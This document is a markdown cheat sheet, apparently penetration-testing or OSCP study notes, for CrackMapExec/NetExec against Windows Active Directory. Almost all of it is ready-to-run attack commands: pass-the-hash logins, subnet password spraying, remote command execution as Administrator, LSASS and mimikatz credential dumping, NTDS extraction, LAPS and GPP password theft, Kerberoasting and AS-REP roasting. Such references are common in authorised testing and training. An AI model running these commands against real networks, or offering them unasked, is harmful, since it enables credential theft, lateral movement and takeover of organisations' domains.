[AD nxc-crackmapexec md 36f15bd2d16c811c8ab4cd9455aa3a1c.md](https://github.com/user-attachments/files/28387882/AD.nxc-crackmapexec.md.36f15bd2d16c811c8ab4cd9455aa3a1c.md)

# AD/nxc-crackmapexec.md

# CrackMapExec / NetExec — Swiss Army Knife

> CME/NetExec is the most complete post-exploitation tool for Windows networks. Spray, enum, execution, dump.
> 

```bash
# Install NetExec (CME successor)
pip install netexec --break-system-packages
# Or:
sudo apt install crackmapexec -y

# Note: netexec uses 'nxc' as command, crackmapexec uses 'crackmapexec'
# Syntax is compatible. Examples below use crackmapexec:
```

---

## Validate credentials

```bash
# With password
crackmapexec smb <IP> -u user -p 'password'
crackmapexec smb <IP> -u user -p 'password' -d domain

# With NTLM hash (PTH)
crackmapexec smb <IP> -u user -H <NTLM_HASH>
crackmapexec smb <IP> -u user -H <NTLM_HASH> --local-auth

# Network sweep (spray across subnet)
crackmapexec smb <IP>/24 -u user -p 'password'

# WinRM
crackmapexec winrm <IP> -u user -p 'password'
```

---

## Enumeration

```bash
# Domain users
crackmapexec smb <IP> -u user -p 'password' --users

# Groups
crackmapexec smb <IP> -u user -p 'password' --groups

# Shares
crackmapexec smb <IP> -u user -p 'password' --shares

# Active sessions
crackmapexec smb <IP> -u user -p 'password' --sessions

# Password policy
crackmapexec smb <IP> -u user -p 'password' --pass-pol

# Hosts in domain
crackmapexec smb <IP> -u user -p 'password' --computers

# RDP
crackmapexec rdp <IP>/24 -u user -p 'password'
```

---

## Command execution

```bash
# Run a command on the machine
crackmapexec smb <IP> -u Administrator -p 'password' -x 'whoami'
crackmapexec smb <IP> -u Administrator -H <HASH> -x 'whoami'

# PowerShell
crackmapexec smb <IP> -u Administrator -p 'password' -X 'Get-Process'

# WinRM (more stable)
crackmapexec winrm <IP> -u Administrator -p 'password' -x 'whoami'
```

---

## Useful modules

```bash
# Dump credentials from memory
crackmapexec smb <IP> -u user -p pass -M lsassy
crackmapexec smb <IP> -u user -p pass -M mimikatz

# LAPS (read local admin password)
crackmapexec ldap <DC-IP> -u user -p pass -M laps

# Gpp_passwords (find GPP creds in SYSVOL)
crackmapexec smb <IP> -u user -p pass -M gpp_password

# Procdump (LSASS dump)
crackmapexec smb <IP> -u user -p pass -M procdump

# List all available modules
crackmapexec smb -L
crackmapexec winrm -L
crackmapexec ldap -L
```

---

## Password Spraying

```bash
# Spray one password against a user list (watch out for lockout)
crackmapexec smb <IP> -u users.txt -p 'Password123' --continue-on-success

# With multiple passwords
crackmapexec smb <IP> -u users.txt -p passwords.txt --no-bruteforce

# Show only successful hits
crackmapexec smb <IP>/24 -u users.txt -p 'Password123' | grep '+'
```

---

## Change expired password (OSCP Forest/Fuse pattern)

```bash
# If the user has an expired password and NXC returns: STATUS_PASSWORD_MUST_CHANGE
# Use smbpasswd:
smbpasswd -r <IP> -U user
# Prompts: old pass → new pass → confirm

# Or with impacket changepasswd:
python3 /usr/share/doc/python3-impacket/examples/changepasswd.py \
  <IP>/user:'OldPass' -newpass 'NewPass123!'

# Or with rpcclient:
rpcclient -U user <IP>
rpcclient $> chgpasswd user 'OldPass' 'NewPass123!'
```

---

## Additional useful NXC/CME modules

```bash
# Local admin groups
nxc smb <IP> -u user -p pass --local-groups

# Share spider with content listing
nxc smb <IP> -u user -p pass -M spider_plus
nxc smb <IP> -u user -p pass -M spider_plus -o READ_ONLY=false

# Search for passwords in shares
nxc smb <IP> -u user -p pass -M scan_files -o PATTERN=password

# NTDS dump (DCSync equivalent)
nxc smb <DC-IP> -u user -p pass --ntds
nxc smb <DC-IP> -u Administrator -H <HASH> --ntds

# Active sessions and logged-on users
nxc smb <IP> -u user -p pass --loggedon-users

# Domain users with description (look for passwords in description)
nxc ldap <DC-IP> -u user -p pass -M get-desc-users

# ADCS enumeration
nxc ldap <DC-IP> -u user -p pass -M adcs

# Find delegations
nxc ldap <DC-IP> -u user -p pass --trusted-for-delegation

# Kerberoasting with NXC
nxc ldap <DC-IP> -u user -p pass --kerberoasting kerberoast.txt

# AS-REP Roasting
nxc ldap <DC-IP> -u user -p pass --asreproast asrep.txt
```

---

## NXC — Available protocols

```bash
# SMB (most used)
nxc smb <IP>

# LDAP (enumerate AD)
nxc ldap <DC-IP>

# WinRM (execute commands)
nxc winrm <IP>

# MSSQL
nxc mssql <IP>

# SSH
nxc ssh <IP>

# FTP
nxc ftp <IP>

# RDP
nxc rdp <IP>

# List all modules for a protocol:
nxc smb -L
nxc ldap -L
nxc mssql -L
```
